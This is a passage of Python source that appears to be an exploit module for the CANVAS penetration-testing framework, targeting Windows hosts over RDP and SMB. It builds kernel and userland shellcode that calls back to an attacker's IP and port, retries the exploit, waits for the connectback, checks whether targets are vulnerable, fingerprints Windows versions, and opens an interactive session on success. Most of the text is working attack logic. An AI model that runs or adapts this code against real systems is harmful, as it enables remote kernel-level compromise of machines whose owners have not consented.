            logging.info('%s attacking %s:%d (failed): We only support local nodes for now' % (self.name, self.host, self.port))
            logging.error('%s done (failed)' % (self.name))
            self.clean()
            return 0

        # Because of the ctypes based current design, this will only run on Unix hosts.
        if not 'Unix Shell' in node.capabilities:
            logging.info('%s attacking %s:%d (failed): your CANVAS host must run Linux for this module.' % (self.name, self.host, self.port))
            logging.error('%s done (failed)' % (self.name))
            self.clean()
            return 0

        current_target = Target(is_64bit = self.is_64bit)
        if self.is_64bit:
            kshellcode = current_target.create_kernel_shellcode(self.callback.ip, self.callback.port)
        else:
            ushellcode = self.create_user_shellcode()
            logging.info('Userland shellcode [size=0x%x]: %s [...] %s' % (len(ushellcode), ushellcode[:8].encode('hex'), ushellcode[-8:].encode('hex')))
            kshellcode = current_target.create_kernel_shellcode(ushellcode)

        logging.info('Kernel land shellcode [size=0x%x]: %s [...] %s' % (len(kshellcode), kshellcode[:8].encode('hex'), kshellcode[-8:].encode('hex')))

        current_target.set_shellcode(kshellcode)

        for i in xrange(5):
            if not self.nr_attempts:
                logging.info('Not allowed to run the exploit anymore')
                break
            ret = self.exploit()
            if ret:
                break
            logging.info('Sleeping 30s in order to save the target!')
            time.sleep(30)

        self.setProgress(100)

        # We might have failed.
        if not ret:
            logging.info('%s attacking %s:%d (failed)' % (self.name, self.host, self.port))
            logging.error('%s done (failed)' % (self.name))
            self.clean()
            return 0

        # At this point exploit() did not encounter any error thus now all that's left is
        # to detect the connectback.

        sleeptime = 20
        logging.info('Sleeping for %ds' % sleeptime)
        IsSucceded = False
        for i in xrange(0, sleeptime, 2):
            if self.state == self.HALT:
                logging.info("Halted")
                break
            logging.info("Slept: %d" % i)
            if self.ISucceeded():
                IsSucceded = True
                break
            time.sleep(2)

        if IsSucceded:
            logging.info('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port))
            logging.info('%s done (Success!)' % (self.name))
            self.clean()
            return 1
        else:
            logging.info('%s attacking %s:%d (failed)' % (self.name, self.host, self.port))
            logging.error('%s done (failed)' % (self.name))
            self.clean()
            return 0

    def clean(self):
        '''
        TODO. Will be cleaning the threads properly.
        '''
        pass

    def is_x86_and_vuln(self):
        ret, result = self.test_disconnect(x64_payload=False)
        if not ret:
            return result
        else:
            # Any error is considered a non vulnerable target (safety first!)
            return False

    def is_x64_and_vuln(self):
        ret, result = self.test_disconnect(x64_payload=True)
        if not ret:
            return result
        else:
            # Any error is considered a non vulnerable target (safety first!)
            return False

    def detect_arch(self):
        '''
        Detect the architecture and also if the target is vulnerable
        at the same time.
        '''

        if self.is_x64_and_vuln():
            logging.warn('%s is a vulnerable x64 target!' % self.host)
            self.is_vulnerable = True
            self.is_64bit = True
            return True

        if self.is_x86_and_vuln():
            logging.warn('%s is a vulnerable x86 target!' % self.host)
            self.is_vulnerable = True
            self.is_64bit = False
            return True

        logging.debug('%s does not appear to be vulnerable! Unable to fingerprint the architecture.' % self.host)
        self.is_vulnerable = False
        return False

    def __detect_windows_version_using_rdp(self):
        '''
        Detect the Windows version using the RDP negotiation feature.
        Note: This works only if the target has a "default" behavior and
        as such should not be trusted. Practically speaking we do not use
        this function (for now) and it remains a skeleton function.
        '''

        logging.info('Attempting to fingerprint %s using RDP' % self.host)

        sockaddr = (self.host, self.port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(sockaddr)

        librdp.set_debug_level(RDP_LOG_NONE)
        rdp = librdp.RDP(s)
        rdp.set_timeout(15)

        requestedProtocols=REDIRECTED_AUTHENTICATION_MODE_REQUIRED|RESTRICTED_ADMIN_MODE_REQUIRED
        ret, x = rdp.connection_request(cookie='Cookie: mstshash=foobar',
                                        flags=0,
                                        requestedProtocols=requestedProtocols)
        if ret:
            logging.error('[-] connection_request() failed!')
            return -1

        selected_protocol, server_flags = x
        logging.debug("Flags=%x, Selected=%x" % (server_flags, selected_protocol))
        return 0

    def __detect_windows_version_using_smb(self):
        '''
        Detect the Windows version using SMB. This is highly reliable
        as soon as the smb port is open.
        '''

        isWindows = True
        logging.info('Attempting to fingerprint %s using SMB' % self.host)
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        app.target.interface = self.host
        app.argsDict["smb"]                 = True
        app.argsDict["http"]                = False # not needed
        app.argsDict["ssh"]                 = False # not needed
        app.argsDict["mdns"]                = False # not needed
        app.argsDict["ntp"]                 = False # not needed
        app.argsDict["ftp"]                 = False # not needed
        app.argsDict["smtp"]                = False # not needed
        app.argsDict["dtspcd"]              = False # not needed
        app.argsDict["ipfi"]                = False # not needed
        app.argsDict["telnet"]              = False # not needed
        app.argsDict["nolanguagedetect"]    = True  # not needed
        if app.run() == 0:
            logging.info('Automatic detection failed')
            return -1, None, None

        myos = app.result
        if myos.base != 'Windows':
            logging.info("A non-Windows host has been detected")
            isWindows = False
            return 0, isWindows, None

        s = self.target.get_knowledge('Lanman')
        if not s:
            return -2, None, None

        windows_version_string = s.get_known_text()
        if '2008 R2' in windows_version_string:
            return 0, isWindows, '2008 R2'
        if '2008' in windows_version_string:
            return 0, isWindows, '2008'
        if '2012' in windows_version_string:
            return 0, isWindows, '2012'
        if '7' in windows_version_string:
            return 0, isWindows, '7'
        if 'XP' in windows_version_string:
            return 0, isWindows, 'XP'

    def detect_windows_version(self):
        '''
        Detect the Windows version using SMB first (if available), RDP
        if not. The SMB detection is very reliable and enough by itself.
        However the RDP one is not and should always not blindly be 
        trusted.
        '''

        ret, is_windows, windows_version = self.__detect_windows_version_using_smb()
        if ret < 0:
            return 'unknown'
        if not ret:
            if not is_windows:
                return 'not windows'
            else:
                return windows_version

    def test(self):
        '''
        Returns True in case of success, False otherwise.
        '''
        self.getArgs()
        logging.info('{} testing host {}:{}'.format(self.name, self.host, self.port))

        fd_array = create_tcp_connections(self.host, self.port, 1, timeout=1)
        if not len(fd_array):
            logging.error("Cannot create any TCP connection!")
            return False

        for fd in fd_array:
            fd.close()

        if self.is_vulnerable is not None:
            return self.is_vulnerable
        else:
            self.detect_arch()
            return self.is_vulnerable


if __name__=='__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
